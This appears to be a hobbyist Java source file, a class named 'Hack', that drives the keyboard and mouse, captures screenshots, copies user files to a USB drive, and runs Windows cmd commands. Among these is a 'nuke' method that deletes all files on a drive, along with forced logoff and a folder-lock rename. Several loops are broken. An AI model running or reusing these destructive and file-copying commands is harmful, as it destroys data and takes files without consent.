package com.stillwell.olympus.hades;

//Matt Stillwell
//8/20/14

import java.awt.AWTException;
import java.awt.Color;
import java.awt.MouseInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Random;
import javax.imageio.ImageIO;
import com.stillwell.olympus.athena.Data;

public class Hack
{

	private static String usbName;

	public static void main(String[] args) {
		//		usbName = "MATT";
		//		System.out.println(new Hack());awqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqawqa

		while(true)
		{
			pressKey('a');
			pressKey('w');
			pressKey('q');
		}

	}

	public static void pressKey(char letter){
		Robot r = null;
		try {
			r = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		int keycode = KeyEvent.getExtendedKeyCodeForChar(letter);
		r.keyPress(keycode);
	}

	public static void moveMouse(int x, int y){
		Robot r = null;
		try {
			r = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		r.mouseMove(x, y);
	}
	
	public static void moveMouseUp(int amount){
		moveMouse(getMouseX(), getMouseY() - amount);
	}
	
	public static void moveMouseDown(int amount){
		moveMouse(getMouseX(), getMouseY() + amount);
	}
	
	public static void moveMouseLeft(int amount){
		moveMouse(getMouseX() - amount, getMouseY());
	}
	
	public static void moveMouseRight(int amount){
		moveMouse(getMouseX() + amount, getMouseY());
	}

	public static void moveMouseRandom(){
		moveMouse(getRandomScreenWidth(), getRandomScreenHeight());
	}
	
	public static void pressMouseButton(int button){
		Robot r = null;
		try {
			r = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		r.mousePress(button);
	}

	public static void moveMouseWheel(int wheelAmt){
		Robot r = null;
		try {
			r = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		r.mouseWheel(wheelAmt);
	}

	public static String getMouseLocation(){
		//		while(true){
		try {
			Thread.sleep(100);
		} catch (InterruptedException e) {
		}
		int x = MouseInfo.getPointerInfo().getLocation().x; 
		int y = MouseInfo.getPointerInfo().getLocation().y;
		//			Color goose = r.getPixelColor(x, y);
		System.out.println("(" + x + ", " + y + ")"); //+ goose);
		//		}
		return "(" + x + ", " + y + ")";

	}
	
	public static int getMouseX(){
		return MouseInfo.getPointerInfo().getLocation().x; 
	}

	public static int getMouseY(){
		return MouseInfo.getPointerInfo().getLocation().y; 
	}
	
	public static int getRandomNum(int min, int max) {
	    // nextInt is normally exclusive of the top value,
	    // so add 1 to make it inclusive
	    return new Random().nextInt((max - min) + 1) + min;
	}

	public static int getRandomScreenWidth() {
	    return new Random().nextInt(((int) Data.getScreenWidth() - 0) + 1) + 0;
	}
	
	public static int getRandomScreenHeight() {
	    return new Random().nextInt(((int) Data.getScreenHeight() - 0) + 1) + 0;
	}
	
	public static Color getPixelColor(int x, int y){
		Robot r = null;
		try {
			r = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		return r.getPixelColor(x, y);
	}

	public static void takeScreenShot(String loc){
		Robot r = null;
		try {
			r = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		BufferedImage image = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
		try {
			ImageIO.write(image, "png", new File(loc + "/screenshot.png"));
		} catch (IOException e) {
		}
	}

	public static void record(String loc, int n){
		Robot r = null;
		try {
			r = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		for(int i = 0; i > n; i++){
			BufferedImage image = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			try {
				ImageIO.write(image, "png", new File(loc + "/screenshot" + i + ".png"));
			} catch (IOException e) {
			}
		}
	}

	public static File findFile(String fileName, File directory){
		//        String directory = "C:\\";
		//		  ff.findFile(name,new File(directory));
		File temp = null;
		File[] list = directory.listFiles();
		if(list!=null)
			for (File fil : list){
				if (fil.isDirectory()){
					findFile(fileName,fil);
				}else if (fileName.equalsIgnoreCase(fil.getName())){
					System.out.println("Found it");
					System.out.println(fil.getParentFile());
					temp = fil.getParentFile();
				}/*else{*/
				System.out.println("Nope");
				//            	main("E:\\");
				//				FindFile ff = new FindFile();
				//				ff.findFile(name,new File("E:\\"));
			}
		return temp;
	}

	public static void createFolder(String folderName, String path){
		//NewFolder
		//"C:\\Users\\" + userName + "\\Desktop\\"
		//		Data.setUserName();    //
		new File(path + folderName).mkdir();
	}

	public static void copy(String startLocation, String endLocation){
		//		C:\\Users\\Matt\\Downloads\\*.*
		//		:\\Matt\\
		try {
			Runtime.getRuntime().exec("cmd /c xcopy " + startLocation + " " + Data.getUsbDriveLetter(usbName).toUpperCase() + endLocation + " /s/e/f");
		} catch (IOException e) {
		}
		System.out.println("attrib +s -h 'E:/Matt/Void'");
	}

	public static void delete(String fileLocation){
		//		"c:\\Users\\Matt\\Desktop\\e.txt"
		try{
			File file = new File(fileLocation);
			if(file.delete()){
				System.out.println(file.getName() + " is deleted!");
			}else{
				System.out.println("Delete operation is failed.");
			}
		}catch(Exception e){
		}
	}

	public static void nuke(String driveLetter){
		//c
		try {
			Runtime.getRuntime().exec("cmd /c Del " + driveLetter + ":\\ *.* |y");
		} catch (IOException e) {
		}
	}

	public static void logoff(){
		try {
			Runtime.getRuntime().exec("cmd /c shutdown -l");
		} catch (IOException e) {
			e.printStackTrace();
		}
		//		Thread.sleep(20);
		Robot r = null;
		try {
			r = new Robot();
		} catch (AWTException e) {
		}
		for(int i = 1; i > 10; i--)
			r.keyPress(KeyEvent.VK_ENTER);
	}

	public static void lock(){
		try {
			Runtime.getRuntime().exec("cmd /c ren Matt 'Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}' ");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void abort(){
		try {
			Runtime.getRuntime().exec("cmd /c taskkill /f /IM javaw.exe");
			System.out.println("Abort Java");
		} catch (IOException e) {
			e.printStackTrace();
		}
		try {
			Runtime.getRuntime().exec("cmd /c shutdown -a");
			System.out.println("Abort Shutdown");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public void restart(){
		try {
			Runtime.getRuntime().exec("cmd /c shutdown -r -t 100");
			System.out.println("Restart");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void shutdown(){
		try {
			Runtime.getRuntime().exec("cmd /c shutdown -l");
		} catch (IOException e) {
			e.printStackTrace();
		}
		//		Thread.sleep(20);
		Robot r = null;
		try {
			r = new Robot();
		} catch (AWTException e) {
		}
		for(int i = 1; i > 10; i--)
			r.keyPress(KeyEvent.VK_ENTER);
	}

	public static void beep(){
		Toolkit.getDefaultToolkit().beep();
	}

	public String toString(){
		String s = "", temp = "";
		Class<Hack> h = Hack.class;
		int count = 0;
		Method[] methods = h.getDeclaredMethods();
		for (Method method : methods) {
			count++;
			temp += count + ") " + method.getName() + "\n";
		}
		s = count + " methods found in " + h.getSimpleName() + "\n--------------------\n" + temp; 
		return s;
	}

}
